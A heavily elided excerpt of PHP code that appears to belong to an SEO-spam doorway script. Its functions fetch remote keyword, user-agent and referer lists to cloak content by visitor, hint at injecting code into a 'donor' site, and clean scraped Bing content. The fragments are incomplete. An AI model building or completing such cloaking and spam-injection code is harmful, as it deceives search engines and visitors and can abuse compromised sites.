<?php
	...
	if(!empty($settings['codetodonor']) && $whattime)
...
function all_keys(){
	...
	global $errors;
	global $new_request;
	$allkeys = $new_request->request($keysfilename_url);
	if (!empty($allkeys)){
...
function cloack($ip)
{
	...
	if (file_exists($cachedirname . "/" . $useragentsfilename)) {
		$useragents = decodedata($new_request->request($useragentsfilename_url),'ua');
	...
	if (file_exists($cachedirname . "/" . $referersfilename)) {
		$goodrefs = decodedata(implode("\n",$new_request->request($referersfilename_url)),'rfr'); 
...
function bingcontent($key, $_lang){ 
	...
	$content = preg_replace('~[^a-zёа-я0-9 -!\?\.\,]~ui',' ',$content); // убираем лишнее, включая табы, скобки и прочее
